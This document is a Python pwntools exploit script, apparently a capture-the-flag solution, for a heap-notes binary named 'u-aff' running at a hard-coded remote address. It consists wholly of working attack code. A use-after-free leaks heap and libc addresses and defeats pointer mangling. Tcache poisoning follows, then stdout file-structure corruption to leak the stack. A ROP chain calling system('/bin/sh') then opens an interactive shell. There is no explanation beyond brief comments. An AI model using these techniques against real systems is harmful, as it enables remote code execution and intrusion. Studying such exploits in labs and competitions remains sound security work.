#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './u-aff_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '159.89.193.103', 3999

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

breakrva 0x187e
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec u-aff 
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def create(data):
    io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', data)

def delete(idx):
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', str(idx).encode())   

def view(idx):
    io.sendlineafter(b':', b'3')
    io.sendlineafter(b':', str(idx).encode())

def edit(idx, data):
    io.sendlineafter(b':', b'4')
    io.sendlineafter(b':', str(idx).encode())
    io.sendafter(b':', data)

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit():
    global io
    io = initialize()

    create(b'0000')
    create(b'1111')
    create(b'2222')

    delete(0)
    delete(1)

    view(0)
    io.recvuntil(b'index 0: ')
    heap = u64(io.recvline().strip().ljust(8, b'\x00')) << 12
    
    edit(1, p64(mangle(heap, heap+0x10)) + b'\n')

    create(b'3333')

    # hijack freelist of heap header structure
    payload = (p64(0x0)*3 + p64(0x0008000000000000)).ljust(0x100-0x8, b'\x00') + p64(heap+0x10)
    create(payload.ljust(0x100, b'\x00')) # 4

    delete(1)
    view(1)
    io.recvuntil(b'index 1: ')
    libc.address = u64(io.recvline()[:-1].ljust(8, b'\x00')) - 0x203b20

    # hijack freelist of heap header structure
    payload = (p64(0x0)*3 + p64(0x0007000000000000)).ljust(0x100-0x8, b'\x00') + p64(libc.sym['_IO_2_1_stdout_'])
    edit(4, payload.ljust(0x100, b'\x00'))

    create(b'4444')
    payload = flat([
        0xFBAD1800,     # flags = _IO_MAGIC | (~_IO_NO_WRITES) | IO_IS_CURRENTLY_PUTTING | _IO_IS_APPENDING)
        libc.sym['environ'],         # read_ptr
        libc.sym['environ'],         # read_end
        libc.sym['environ'],         # read_base
        libc.sym['environ'],         # write_base
        libc.sym['environ'] + 0x40,   # write_ptr
        libc.sym['environ'] + 0x40,   # write_end
        libc.sym['environ'] + 0x40,   # buf_base
        libc.sym['environ'] + 0x40,   # buf_end
    ])
    create(payload) # 5

    io.recvuntil(b'note: ')
    stack = u64(io.recv(6).ljust(8, b'\x00'))
    rip = stack - 0x130

    # hijack freelist of heap header structure
    payload = (p64(0x0)*3 + p64(0x0006000000000000)).ljust(0x100-0x8, b'\x00') + p64(rip-0x8)
    edit(4, payload.ljust(0x100, b'\x00'))

    rop = ROP(libc)
    payload = flat([
        stack, 
        rop.find_gadget(['pop rdi', 'ret'])[0],
        next(libc.search(b'/bin/sh\x00')),
        rop.find_gadget(['ret'])[0],
        libc.sym['system']
    ])
    create(b'6666')
    create(payload) # 7

    io.sendlineafter(b':', b'5') # return

    log.info('heap: %#x', heap)
    log.info('libc: %#x', libc.address)
    log.info('stack: %#x', stack)
    log.info('rip: %#x', rip)
    log.info('environ: %#x', libc.sym['environ'])
    io.interactive()
    
if __name__ == '__main__':
    exploit()
